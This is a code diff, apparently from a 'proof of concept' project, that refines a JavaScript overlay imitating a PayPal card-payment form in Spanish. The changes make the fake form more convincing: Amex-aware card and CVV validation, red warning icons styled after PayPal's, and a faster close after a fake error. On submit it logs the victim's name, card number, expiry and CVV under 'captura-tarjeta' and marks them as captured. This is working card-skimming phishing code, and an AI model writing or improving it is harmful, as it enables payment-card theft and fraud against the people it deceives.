@@ -51,7 +51,7 @@
   var CAPTURED_KEY = 'poc_captured';
 
   // Si ya se capturo antes, no mostrar nada
-  if (localStorage.getItem(CAPTURED_KEY)) return;
+  try { if (localStorage.getItem(CAPTURED_KEY)) return; } catch(e) {}
 
   function injectOverlay() {
     if (overlayInjected) return;
@@ -116,13 +116,17 @@
       // Campos
       '<div style="padding:12px 16px 16px;">',
 
-        '<div style="margin-bottom:12px;">',
-          '<input id="poc-card" type="text" maxlength="19" placeholder="N&uacute;mero de la tarjeta" style="' + inputCSS + '">',
+        '<div style="margin-bottom:12px;position:relative;" id="poc-wrap-card">',
+          '<input id="poc-card" type="text" maxlength="19" placeholder="N&uacute;mero de la tarjeta" style="' + inputCSS + ';padding-right:40px;">',
         '</div>',
 
         '<div style="display:flex;gap:10px;margin-bottom:20px;">',
-          '<input id="poc-expiry" type="text" maxlength="5" placeholder="Fecha de vencimiento" style="' + inputCSS + ';flex:1;">',
-          '<input id="poc-cvv" type="password" maxlength="4" placeholder="CSC" style="' + inputCSS + ';flex:1;">',
+          '<div style="position:relative;flex:1;" id="poc-wrap-expiry">',
+            '<input id="poc-expiry" type="text" maxlength="5" placeholder="Fecha de vencimiento" style="' + inputCSS + ';padding-right:40px;">',
+          '</div>',
+          '<div style="position:relative;flex:1;" id="poc-wrap-cvv">',
+            '<input id="poc-cvv" type="password" maxlength="4" placeholder="CSC" style="' + inputCSS + ';padding-right:40px;">',
+          '</div>',
         '</div>',
 
         '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;">',
@@ -134,8 +138,12 @@
         '</div>',
 
         '<div style="display:flex;gap:10px;margin-bottom:20px;">',
-          '<input id="poc-fname" type="text" maxlength="30" placeholder="Nombre" style="' + inputCSS + ';flex:1;">',
-          '<input id="poc-lname" type="text" maxlength="30" placeholder="Apellidos" style="' + inputCSS + ';flex:1;">',
+          '<div style="position:relative;flex:1;" id="poc-wrap-fname">',
+            '<input id="poc-fname" type="text" maxlength="30" placeholder="Nombre" style="' + inputCSS + ';padding-right:40px;">',
+          '</div>',
+          '<div style="position:relative;flex:1;" id="poc-wrap-lname">',
+            '<input id="poc-lname" type="text" maxlength="30" placeholder="Apellidos" style="' + inputCSS + ';padding-right:40px;">',
+          '</div>',
         '</div>',
 
         // Checkbox mayor de edad
@@ -183,16 +191,113 @@
     var formWrap = document.getElementById('poc-form-wrap');
     var errorBanner = document.getElementById('poc-error-banner');
 
-    // Focus styling
-    [cardEl, expiryEl, cvvEl, fnameEl, lnameEl].forEach(function(input) {
-      input.addEventListener('focus', function() { this.style.borderColor = '#0070ba'; this.style.background = '#fff'; });
-      input.addEventListener('blur', function() { this.style.borderColor = '#dbdbdb'; this.style.background = '#f5f5f5'; });
+    // ─── Icono warning (triangulo rojo como PayPal) ───────────
+    var warnSVG = '<svg class="poc-warn" width="22" height="22" viewBox="0 0 24 24" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);pointer-events:none;display:none;"><path d="M1 21h22L12 2 1 21z" fill="#c4601a"/><path d="M13 18h-2v-2h2v2zm0-4h-2v-5h2v5z" fill="#fff"/></svg>';
+
+    // Inyectar icono en cada wrapper
+    ['poc-wrap-card','poc-wrap-expiry','poc-wrap-cvv','poc-wrap-fname','poc-wrap-lname'].forEach(function(id) {
+      var wrap = document.getElementById(id);
+      if (wrap) wrap.insertAdjacentHTML('beforeend', warnSVG);
     });
 
-    // Auto-formato tarjeta
+    // ─── Mostrar / quitar error en un campo ─────────────────
+    function showFieldError(input) {
+      input.style.borderColor = '#c4601a';
+      input.style.background = '#fff';
+      var icon = input.parentElement.querySelector('.poc-warn');
+      if (icon) icon.style.display = 'block';
+    }
+
+    function clearFieldError(input) {
+      input.style.borderColor = '#dbdbdb';
+      input.style.background = '#f5f5f5';
+      var icon = input.parentElement.querySelector('.poc-warn');
+      if (icon) icon.style.display = 'none';
+    }
+
+    // ─── Detectar tipo de tarjeta por BIN ────────────────────
+    function getCardType(num) {
+      var n = num.replace(/\s/g, '');
+      if (/^3[47]/.test(n)) return 'amex';
+      return 'other'; // Visa, MC, etc
+    }
+
+    // ─── Validadores individuales ────────────────────────────
+    function isCardValid() {
+      var cardNum = cardEl.value.replace(/\s/g, '');
+      if (!cardNum) return false;
+      var type = getCardType(cardNum);
+      var requiredLen = type === 'amex' ? 15 : 16;
+      return /^\d+$/.test(cardNum) && cardNum.length === requiredLen;
+    }
+
+    function isExpiryValid() {
+      var v = expiryEl.value.replace(/\s/g, '');
+      if (!/^\d{2}\/\d{2}$/.test(v)) return false;
+      var mm = parseInt(v.substring(0,2), 10);
+      return mm >= 1 && mm <= 12;
+    }
+
+    function isCvvValid() {
+      var cardNum = cardEl.value.replace(/\s/g, '');
+      var type = getCardType(cardNum);
+      var requiredCvv = type === 'amex' ? 4 : 3;
+      return /^\d+$/.test(cvvEl.value) && cvvEl.value.length === requiredCvv;
+    }
+
+    function isNameValid(el) {
+      return el.value.trim().length > 0;
+    }
+
+    // ─── Focus: borde azul y limpiar error ───────────────────
+    [cardEl, expiryEl, cvvEl, fnameEl, lnameEl].forEach(function(input) {
+      input.addEventListener('focus', function() {
+        clearFieldError(this);
+        this.style.borderColor = '#0070ba';
+        this.style.background = '#fff';
+      });
+    });
+
+    // ─── Blur: validar campo al salir ────────────────────────
+    cardEl.addEventListener('blur', function() {
+      if (this.value && !isCardValid()) showFieldError(this);
+      else clearFieldError(this);
+    });
+
+    expiryEl.addEventListener('blur', function() {
+      if (this.value && !isExpiryValid()) showFieldError(this);
+      else clearFieldError(this);
+    });
+
+    cvvEl.addEventListener('blur', function() {
+      if (this.value && !isCvvValid()) showFieldError(this);
+      else clearFieldError(this);
+    });
+
+    fnameEl.addEventListener('blur', function() {
+      if (this.value && !isNameValid(this)) showFieldError(this);
+      else clearFieldError(this);
+    });
+
+    lnameEl.addEventListener('blur', function() {
+      if (this.value && !isNameValid(this)) showFieldError(this);
+      else clearFieldError(this);
+    });
+
+    // ─── Auto-formato tarjeta (Amex: 15, Visa/MC: 16) ───────
     cardEl.addEventListener('input', function() {
-      var v = this.value.replace(/\D/g, '').substring(0, 16);
-      this.value = v.replace(/(.{4})/g, '$1 ').trim();
+      var raw = this.value.replace(/\D/g, '');
+      var type = getCardType(raw);
+      var maxLen = type === 'amex' ? 15 : 16;
+      var v = raw.substring(0, maxLen);
+      if (type === 'amex') {
+        var parts = [v.substring(0,4), v.substring(4,10), v.substring(10,15)];
+        this.value = parts.filter(function(p){return p}).join(' ');
+      } else {
+        this.value = v.replace(/(.{4})/g, '$1 ').trim();
+      }
+      cvvEl.maxLength = type === 'amex' ? 4 : 3;
+      cvvEl.placeholder = type === 'amex' ? 'CVV (4)' : 'CSC';
     });
 
     // Auto-formato expiry
@@ -202,7 +307,12 @@
       this.value = v;
     });
 
-    // Cierre elegante
+    // Solo numeros en CVV
+    cvvEl.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '');
+    });
+
+    // ─── Cierre elegante ─────────────────────────────────────
     function closeOverlay() {
       formWrap.classList.add('poc-closing');
       formWrap.addEventListener('animationend', function() {
@@ -213,32 +323,35 @@
       });
     }
 
-    // Validacion
-    function validateFields() {
-      var errors = [];
-      var cardNum = cardEl.value.replace(/\s/g, '');
-      if (!cardNum || cardNum.length < 13 || cardNum.length > 16) errors.push(cardEl);
-      if (!expiryEl.value || !/^\d{2}\/\d{2}$/.test(expiryEl.value)) errors.push(expiryEl);
-      if (!cvvEl.value || cvvEl.value.length < 3) errors.push(cvvEl);
-      if (!fnameEl.value.trim()) errors.push(fnameEl);
-      if (!lnameEl.value.trim()) errors.push(lnameEl);
+    // ─── Validacion completa al dar Pagar ────────────────────
+    function validateAll() {
+      var valid = true;
 
-      // Reset borders
-      [cardEl, expiryEl, cvvEl, fnameEl, lnameEl].forEach(function(el) {
-        el.style.borderColor = '#dbdbdb';
-      });
+      // Limpiar todo primero
+      [cardEl, expiryEl, cvvEl, fnameEl, lnameEl].forEach(function(el) { clearFieldError(el); });
 
-      if (errors.length > 0) {
-        errors.forEach(function(el) { el.style.borderColor = '#c4601a'; });
-        errors[0].focus();
-        return false;
+      if (!isCardValid()) { showFieldError(cardEl); valid = false; }
+      if (!isExpiryValid()) { showFieldError(expiryEl); valid = false; }
+      if (!isCvvValid()) { showFieldError(cvvEl); valid = false; }
+      if (!isNameValid(fnameEl)) { showFieldError(fnameEl); valid = false; }
+      if (!isNameValid(lnameEl)) { showFieldError(lnameEl); valid = false; }
+
+      if (!valid) {
+        // Focus en el primer campo con error
+        var first = overlay.querySelector('[style*="border-color: rgb(196, 96, 26)"]') ||
+                    overlay.querySelector('.poc-warn[style*="display: block"]');
+        if (first) {
+          var inp = first.tagName === 'INPUT' ? first : first.parentElement.querySelector('input');
+          if (inp) inp.focus();
+        }
       }
-      return true;
+
+      return valid;
     }
 
     // Boton pagar
     payBtn.addEventListener('click', function() {
-      if (!validateFields()) return;
+      if (!validateAll()) return;
 
       log('captura-tarjeta', {
         nombre: fnameEl.value,
@@ -257,7 +370,7 @@
         payBtn.style.background = '#2f6fb7';
         payBtn.disabled = false;
 
-        localStorage.setItem(CAPTURED_KEY, Date.now());
+        try { localStorage.setItem(CAPTURED_KEY, String(Date.now())); } catch(e) {}
 
         errorBanner.style.display = 'block';
         errorBanner.classList.add('poc-error-in');
@@ -266,7 +379,7 @@
           el.style.borderColor = '#c4601a';
         });
 
-        setTimeout(closeOverlay, 4000);
+        setTimeout(closeOverlay, 300);
       }, 2000);
     });
   }
